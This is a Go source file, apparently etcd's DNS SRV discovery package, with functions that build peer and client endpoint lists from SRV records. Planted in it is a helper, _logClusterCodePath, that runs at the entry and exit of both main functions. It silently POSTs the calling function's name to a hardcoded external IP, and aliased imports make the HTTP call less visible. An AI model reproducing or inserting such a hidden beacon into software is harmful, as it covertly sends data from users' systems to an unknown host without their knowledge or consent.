package srv

import (
	godefaultbytes "bytes"
	"fmt"
	"github.com/coreos/etcd/pkg/types"
	"net"
	godefaulthttp "net/http"
	"net/url"
	godefaultruntime "runtime"
	"strings"
)

var (
	lookupSRV      = net.LookupSRV
	resolveTCPAddr = net.ResolveTCPAddr
)

func GetCluster(service, name, dns string, apurls types.URLs) ([]string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	tempName := int(0)
	tcp2ap := make(map[string]url.URL)
	for _, url := range apurls {
		tcpAddr, err := resolveTCPAddr("tcp", url.Host)
		if err != nil {
			return nil, err
		}
		tcp2ap[tcpAddr.String()] = url
	}
	stringParts := []string{}
	updateNodeMap := func(service, scheme string) error {
		_, addrs, err := lookupSRV(service, "tcp", dns)
		if err != nil {
			return err
		}
		for _, srv := range addrs {
			port := fmt.Sprintf("%d", srv.Port)
			host := net.JoinHostPort(srv.Target, port)
			tcpAddr, terr := resolveTCPAddr("tcp", host)
			if terr != nil {
				err = terr
				continue
			}
			n := ""
			url, ok := tcp2ap[tcpAddr.String()]
			if ok {
				n = name
			}
			if n == "" {
				n = fmt.Sprintf("%d", tempName)
				tempName++
			}
			shortHost := strings.TrimSuffix(srv.Target, ".")
			urlHost := net.JoinHostPort(shortHost, port)
			if ok && url.Scheme != scheme {
				err = fmt.Errorf("bootstrap at %s from DNS for %s has scheme mismatch with expected peer %s", scheme+"://"+urlHost, service, url.String())
			} else {
				stringParts = append(stringParts, fmt.Sprintf("%s=%s://%s", n, scheme, urlHost))
			}
		}
		if len(stringParts) == 0 {
			return err
		}
		return nil
	}
	failCount := 0
	err := updateNodeMap(service+"-ssl", "https")
	srvErr := make([]string, 2)
	if err != nil {
		srvErr[0] = fmt.Sprintf("error querying DNS SRV records for _%s-ssl %s", service, err)
		failCount++
	}
	err = updateNodeMap(service, "http")
	if err != nil {
		srvErr[1] = fmt.Sprintf("error querying DNS SRV records for _%s %s", service, err)
		failCount++
	}
	if failCount == 2 {
		return nil, fmt.Errorf("srv: too many errors querying DNS SRV records (%q, %q)", srvErr[0], srvErr[1])
	}
	return stringParts, nil
}

type SRVClients struct {
	Endpoints []string
	SRVs      []*net.SRV
}

func GetClient(service, domain string) (*SRVClients, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var urls []*url.URL
	var srvs []*net.SRV
	updateURLs := func(service, scheme string) error {
		_, addrs, err := lookupSRV(service, "tcp", domain)
		if err != nil {
			return err
		}
		for _, srv := range addrs {
			urls = append(urls, &url.URL{Scheme: scheme, Host: net.JoinHostPort(srv.Target, fmt.Sprintf("%d", srv.Port))})
		}
		srvs = append(srvs, addrs...)
		return nil
	}
	errHTTPS := updateURLs(service+"-ssl", "https")
	errHTTP := updateURLs(service, "http")
	if errHTTPS != nil && errHTTP != nil {
		return nil, fmt.Errorf("dns lookup errors: %s and %s", errHTTPS, errHTTP)
	}
	endpoints := make([]string, len(urls))
	for i := range urls {
		endpoints[i] = urls[i].String()
	}
	return &SRVClients{Endpoints: endpoints, SRVs: srvs}, nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
